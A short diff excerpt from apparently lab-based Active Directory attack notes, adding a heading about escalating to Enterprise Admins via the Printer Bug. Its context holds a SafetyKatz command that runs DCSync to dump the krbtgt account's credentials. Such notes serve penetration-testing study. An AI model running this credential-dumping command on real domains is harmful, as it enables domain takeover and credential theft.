@@ -654,3 +654,5 @@ And launch safetykatz to dcsync
 ```powershell
 C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
 ```
+
+*Escalate to Enterprise Admins privileges by abusing Printer Bug!*
